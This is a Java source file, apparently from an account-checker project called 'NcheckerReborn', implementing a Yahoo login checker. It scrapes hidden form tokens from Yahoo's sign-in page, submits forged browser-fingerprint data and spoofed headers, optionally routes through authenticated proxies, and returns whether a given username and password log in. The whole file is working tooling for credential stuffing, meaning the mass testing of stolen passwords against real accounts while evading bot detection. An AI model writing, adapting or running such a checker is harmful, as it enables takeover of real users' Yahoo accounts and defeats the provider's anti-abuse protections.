package dev.tolja.Utils;

import dev.tolja.Data.ProxyInfo;
import org.apache.http.HttpHost;
import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CookieStore;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.protocol.HttpClientContext;
import org.apache.http.impl.client.*;
import org.apache.http.message.BasicNameValuePair;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

/**
 * package dev.Nchecker.Utils
 * project NcheckerReborn
 * Created by @author XBigRiceH on date 2021/08/08
 */
public class YahooUtils {
    public static boolean checkYahoo(String username, String password, ProxyInfo proxy) {
        try {
            HttpClientContext httpClientContext = new HttpClientContext();
            CookieStore cookieStore = new BasicCookieStore();
            RequestConfig.Builder requestConfig = RequestConfig.custom().setRedirectsEnabled(false).setConnectTimeout(30000).setSocketTimeout(30000)
                    .setConnectionRequestTimeout(30000);
            CloseableHttpClient closeableHttpClient = HttpClientBuilder.create().setKeepAliveStrategy(new DefaultConnectionKeepAliveStrategy())
                    .setRedirectStrategy(new DefaultRedirectStrategy()).setDefaultRequestConfig(requestConfig.build())
                    .setDefaultCookieStore(cookieStore).build();
            if (proxy != null) {
                HttpHost prox = new HttpHost(proxy.getHost(), proxy.getPort(), "http");
                if (proxy.isHasAuthentication()) {
                    CredentialsProvider provider = new BasicCredentialsProvider();
                    provider.setCredentials(new AuthScope(prox), new UsernamePasswordCredentials(proxy.getUsername(), proxy.getPassword()));
                    requestConfig.setProxy(prox);
                    closeableHttpClient = HttpClientBuilder.create().setKeepAliveStrategy(new DefaultConnectionKeepAliveStrategy())
                            .setRedirectStrategy(new DefaultRedirectStrategy()).setDefaultRequestConfig(requestConfig.build())
                            .setDefaultCookieStore(cookieStore).setDefaultCredentialsProvider(provider).build();
                }
            }

            HttpGet google_to_yahoo = new HttpGet("https://login.yahoo.com/");
            google_to_yahoo.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
            google_to_yahoo.setHeader("Accept-Encoding", "gzip, deflate, br");
            google_to_yahoo.setHeader("Accept-Language", "en-US,en;q=0.9,fa;q=0.8");
            google_to_yahoo.setHeader("Cache-Control", "max-age=0");
            google_to_yahoo.setHeader("Connection", "keep-alive");
            google_to_yahoo.setHeader("Referer", "https://www.google.com/");
            google_to_yahoo.setHeader("Sec-Fetch-Dest", "document");
            google_to_yahoo.setHeader("Sec-Fetch-Mode", "navigate");
            google_to_yahoo.setHeader("Sec-Fetch-Site", "cross-site");
            google_to_yahoo.setHeader("Sec-Fetch-User", "?1");
            google_to_yahoo.setHeader("Upgrade-Insecure-Requests", "1");
            google_to_yahoo.setHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1");
            String google_to_yahoo_res = copyResponse2Str(closeableHttpClient.execute(google_to_yahoo, httpClientContext)).trim().replace(" ", "").replace("\n", "").replace("\t", "");
            String acrumb = google_to_yahoo_res.substring(google_to_yahoo_res.indexOf("acrumb\"value=\"") + "acrumb\"value=\"".length(), google_to_yahoo_res.indexOf("\"/><inputtype=\"hidden\"name=\"sessionIndex"));
            String crumb = google_to_yahoo_res.substring(google_to_yahoo_res.indexOf("crumb\"value=\"") + "crumb\"value=\"".length(), google_to_yahoo_res.indexOf("\"/><inputtype=\"hidden\"name=\"acrumb"));
            String sessionIndex = google_to_yahoo_res.substring(google_to_yahoo_res.indexOf("sessionIndex\"value=\"") + "sessionIndex\"value=\"".length(), google_to_yahoo_res.indexOf("\"/><inputtype=\"hidden\"name=\"displayName"));

            HttpPost yahoo_login_1 = new HttpPost("https://login.yahoo.com/");
            yahoo_login_1.setHeader("Accept", "*/*");
            yahoo_login_1.setHeader("Pragma", "no-cache");
            yahoo_login_1.setHeader("Accept-Encoding", "gzip, deflate, br");
            yahoo_login_1.setHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
            yahoo_login_1.setHeader("Accept-Language", "en-US,en;q=0.9");
            yahoo_login_1.setHeader("Host", "login.yahoo.com");
            yahoo_login_1.setHeader("bucket", "mbr-phoenix-gpst");
            yahoo_login_1.setHeader("Connection", "keep-alive");
            yahoo_login_1.setHeader("Origin", "https://login.yahoo.com");
            yahoo_login_1.setHeader("Referer", "https://login.yahoo.com/");
            yahoo_login_1.setHeader("Sec-Fetch-Dest", "empty");
            yahoo_login_1.setHeader("Sec-Fetch-Mode", "cors");
            yahoo_login_1.setHeader("Sec-Fetch-Site", "same-origin");
            yahoo_login_1.setHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1");
            yahoo_login_1.setHeader("X-Requested-With", "XMLHttpRequest");
            List<BasicNameValuePair> yahoo_login_1_data = new ArrayList<>();
            new HashMap<String, String>() {{
                put("browser-fp-data", "{\"language\":\"en-US\",\"colorDepth\":24,\"deviceMemory\":8,\"pixelRatio\":1,\"hardwareConcurrency\":12,\"timezoneOffset\":-480,\"timezone\":\"Asia/Shanghai\",\"sessionStorage\":1,\"localStorage\":1,\"indexedDb\":1,\"openDatabase\":1,\"cpuClass\":\"unknown\",\"platform\":\"Win32\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":3,\"hash\":\"e43a8bc708fc490225cde0663b28278c\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Direct3D11 vs_5_0 ps_5_0, D3D11-30.0.14.7141)\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":0,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":0,\"event\":0,\"start\":0},\"fonts\":{\"count\":48,\"hash\":\"62d5bbf307ed9e959ad3d5ad6ccd3951\"},\"audio\":\"124.04347527516074\",\"resolution\":{\"w\":\"2560\",\"h\":\"1080\"},\"availableResolution\":{\"w\":\"1032\",\"h\":\"2560\"},\"ts\":{\"serve\":1628395632590,\"render\":1628395618819}}");
                put("crumb", crumb);
                put("acrumb", acrumb);
                put("sessionIndex", sessionIndex);
                put("displayName", "");
                put("deviceCapability", "{\"pa\":{\"status\":false}}");
                put("username", username);
                put("passwd", "");
                put("signin", "Next");
                put("persistent", "y");
            }}.forEach((key, value) -> yahoo_login_1_data.add(new BasicNameValuePair(key, value)));
            yahoo_login_1.setEntity(new UrlEncodedFormEntity(yahoo_login_1_data, StandardCharsets.UTF_8));
            String yahoo_login_1_res = copyResponse2Str(closeableHttpClient.execute(yahoo_login_1, httpClientContext)).trim().replace(" ", "").replace("\n", "").replace("\t", "");
            yahoo_login_1_res = yahoo_login_1_res.substring(13, yahoo_login_1_res.length() - 2);

            HttpPost yahoo_login_2 = new HttpPost("https://login.yahoo.com" + yahoo_login_1_res);
            yahoo_login_2.setHeader("Host", "login.yahoo.com");
            yahoo_login_2.setHeader("Connection", "keep-alive");
            yahoo_login_2.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
            yahoo_login_2.setHeader("X-Requested-With", "XMLHttpRequest");
            yahoo_login_2.setHeader("Origin", "https://login.yahoo.com");
            yahoo_login_2.setHeader("Sec-Fetch-Site", "same-origin");
            yahoo_login_2.setHeader("Sec-Fetch-Mode", "cors");
            yahoo_login_2.setHeader("Sec-Fetch-Dest", "empty");
            yahoo_login_2.setHeader("Referer", "https://login.yahoo.com/");
            yahoo_login_2.setHeader("Accept-Encoding", "gzip, deflate, br");
            yahoo_login_2.setHeader("Accept-Language", "en-US,en;q=0.9");
            List<BasicNameValuePair> yahoo_login_2_data = new ArrayList<>();
            new HashMap<String, String>() {{
                put("browser-fp-data", "{\"language\":\"en\",\"colorDepth\":32,\"deviceMemory\":\"unknown\",\"pixelRatio\":2,\"hardwareConcurrency\":\"unknown\",\"timezoneOffset\":-60,\"timezone\":\"Africa/Casablanca\",\"sessionStorage\":1,\"localStorage\":1,\"indexedDb\":1,\"cpuClass\":\"unknown\",\"platform\":\"iPhone\",\"doNotTrack\":\"unknown\",\"plugins\":{\"count\":0,\"hash\":\"24700f9f1986800ab4fcc880530dd0ed\"},\"canvas\":\"canvas winding:yes~canvas\",\"webgl\":1,\"webglVendorAndRenderer\":\"Apple Inc.~Apple GPU\",\"adBlock\":0,\"hasLiedLanguages\":0,\"hasLiedResolution\":0,\"hasLiedOs\":1,\"hasLiedBrowser\":0,\"touchSupport\":{\"points\":5,\"event\":1,\"start\":1},\"fonts\":{\"count\":13,\"hash\":\"ef5cebb772562bd1af018f7f69d53c9e\"},\"audio\":\"35.10892717540264\",\"resolution\":{\"w\":\"414\",\"h\":\"896\"},\"availableResolution\":{\"w\":\"896\",\"h\":\"414\"},\"ts\":{\"serve\":1604943657070,\"render\":1604943657274}}");
                put("crumb", crumb);
                put("acrumb", acrumb);
                put("sessionIndex", sessionIndex);
                put("displayName", username);
                put("passwordContext", "normal");
                put("password", password);
                put("verifyPassword", "Next");
            }}.forEach((key, value) -> yahoo_login_2_data.add(new BasicNameValuePair(key, value)));
            yahoo_login_2.setEntity(new UrlEncodedFormEntity(yahoo_login_2_data, StandardCharsets.UTF_8));
            String yahoo_login_2_res = copyResponse2Str(closeableHttpClient.execute(yahoo_login_2, httpClientContext));
            return yahoo_login_2_res.contains("https://guce.yahoo.com/consent");
        } catch (Exception ignored) {
            return false;
        }
    }

    private static String copyResponse2Str(CloseableHttpResponse response) {
        try {
            return copyInputStream2Str(response.getEntity().getContent());
        } catch (Exception ignored) {

        }
        return null;
    }

    private static String copyInputStream2Str(InputStream in) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(in, StandardCharsets.UTF_8));
            String line = null;
            StringBuilder sb = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                sb.append(line);
            }
            return sb.toString();
        } catch (Exception ignored) {
        }
        return null;
    }
}
